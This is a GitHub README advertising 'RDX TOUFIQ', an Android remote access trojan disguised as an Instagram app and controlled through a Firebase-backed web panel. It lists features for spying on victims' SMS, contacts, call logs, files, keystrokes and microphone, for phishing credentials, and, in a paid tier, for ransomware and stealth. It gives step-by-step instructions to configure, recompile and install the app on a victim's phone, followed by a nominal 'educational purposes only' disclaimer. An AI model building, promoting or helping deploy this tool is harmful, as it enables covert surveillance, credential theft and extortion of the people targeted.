[![Typing SVG](https://readme-typing-svg.herokuapp.com?size=30&color=06F705&background=000000&lines=%F0%9D%90%96%F0%9D%90%9E%F0%9D%90%A5%F0%9D%90%A5%F0%9D%90%9C%F0%9D%90%A8%F0%9D%90%A6%F0%9D%90%9E+%F0%9D%90%8C%F0%9D%90%B2+%F0%9D%90%86%F0%9D%90%A2%F0%9D%90%AD+%F0%9D%90%87%F0%9D%90%AE%F0%9D%90%9B%F0%9F%99%82%F0%9F%92%94;%F0%9D%90%88%F0%9D%90%AD%E2%80%99%F0%9D%90%AC++%F0%9D%90%81%F0%9D%90%AB%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D+%F0%9D%90%93%F0%9D%90%8E%F0%9D%90%94%F0%9D%90%85%F0%9D%90%88%F0%9D%90%90%F0%9F%99%82%F0%9F%98%88;%F0%9D%90%85%F0%9D%90%A8%F0%9D%90%A5%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%B0+%F0%9D%90%8C%F0%9D%90%B2+%F0%9D%90%86%F0%9D%90%A2%F0%9D%90%AD+%F0%9D%90%8C%F0%9D%90%B2+%F0%9D%90%86%F0%9D%90%A2%F0%9D%90%AD+%F0%9D%90%A1%F0%9D%90%AE%F0%9D%90%9B%F0%9F%98%8A;%F0%9D%90%85%F0%9D%90%A8%F0%9D%90%A5%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%B0+%F0%9D%90%8C%F0%9D%90%B2+%F0%9D%90%85%F0%9D%90%9B+%26+%F0%9D%90%8F%F0%9D%90%9A%F0%9D%90%A0%F0%9D%90%9E%F0%9F%98%8D%F0%9F%98%8A;%F0%9D%90%93%F0%9D%90%8E%F0%9D%90%94%F0%9D%90%85%F0%9D%90%88%F0%9D%90%90+%F0%9D%90%8E%F0%9D%90%A7+%F0%9D%90%85%F0%9D%90%A2%F0%9D%90%A5%F0%9D%90%9E%F0%9F%98%88%F0%9F%94%A5;%F0%9D%90%94%F0%9D%90%A4%F0%9D%90%B2+%F0%9D%90%81%F0%9D%90%B2%F0%9D%90%9E+%F0%9D%90%96%F0%9D%9F%96+%F0%9D%90%85%F0%9D%90%A8%F0%9D%90%AB+%F0%9D%90%94%F0%9D%90%A9%F0%9D%90%9D%F0%9D%90%9A%F0%9D%90%AD%F0%9D%90%9E+%F0%9D%90%93%F0%9D%90%A8%F0%9D%90%A8%F0%9D%90%A5%F0%9D%90%AC)](https://git.io/typing-svg)

<p align="center">
![Picsart_22-08-11_23-17-31-296](https://user-images.githubusercontent.com/109971912/184354484-7fc5a8c9-7d85-406b-ade9-c325bc4035b5.jpg)

</p>
<h1 align=center>RDX TOUFIQ</h1>

#### A MULTIFUNCTIONAL ANDROID RAT WITH GUI BASED WEB PANEL WITHOUT PORT FORWARDING.

## FEATURES
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing ](https://github.com/Th30neAnd0nly/PI)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed

<img align=center src=./.github/img.jpg >


## Requirements
 - Firebase Account
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)


## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - ```js
          {
           "rules": {
                   ".read": "true",
                   ".write": "true"
                    }
          }
      ```
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service firebase.storage {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/302dca641bb04c6bed72d1b2cebdfc79ccfbb046/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### Android RAT
 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
 1. Decompile it using any Decompiler recommend above.
 1. Now open `res/values/strings.xml` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
    - Example 
       ```xml 
       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
       <string name="google_api_key">your_api_key</string>
       <string name="google_app_id">your_app_id</string>
       <string name="google_storage_bucket">your_storage_bucket_url</string>
       <string name="project_id">project_id</string>
       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
 
## TOUFIQ PRO <img src='WEB PANEL/img/logo.png' style="height:30px;width:30px;" >
 1. Read , Delete files from victim's device
 1. Encrypt any file in victim's device
 1. Lock Victims Device with 4 digit Pin Code
 1. Capture Photo from Camera
 1. Get Sim Card Information
 1. Ransomware (encrypt all the files and show the notification demanding for ransom)
 1. Auto Start Permission for all chinese vendors.
 1. Hidden App without Foreground service notification (full stealth mode)
  ### IT’S RDX TOUFIQ BRAND 
  

## CONTACT RDX TOUFIQ 
 1. [Facebook](https://www.facebook.com/Remember.This.Name.ToufiQ.K1NG)
 2. [Facebook Page](https://www.facebook.com/RDX.T0UFIQ)
 3. [Whatapp](https://wa.me/+8801812027446)

## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the TOUFIQ is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).








